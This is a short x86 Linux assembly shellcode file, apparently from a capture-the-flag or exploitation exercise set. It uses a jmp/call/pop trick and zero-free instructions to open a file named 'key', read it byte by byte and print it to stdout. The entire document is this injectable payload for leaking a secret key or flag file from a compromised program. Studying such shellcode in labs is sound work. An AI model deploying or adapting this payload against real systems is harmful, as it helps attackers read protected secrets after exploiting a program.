section .text

global _start

        %include "../../../utils_linux_x86.asm"
_start:
	jmp FILENAME
RET:
	;; open()
	xor eax, eax
	mov al, SYS_OPEN
	pop ebx
	xor ecx, ecx   		; RD_ONLY
	int 0x80

	mov esi, eax

	dec esp
.LOOP:
	;; read()
	mov al, SYS_READ	; supose eax < 0xff
	mov ebx, esi
	mov ecx, esp
	xor edx, edx
	inc edx
	int 0x80

	xchg edx, eax
	mov al, SYS_WRITE
	xor ebx, ebx
	inc ebx
	mov ecx, esp
	int 0x80

	test edx, edx
	jne short .LOOP

	xor eax, eax
	inc eax
	int 0x80

FILENAME:
call RET
string:	 db 'key', 0x0
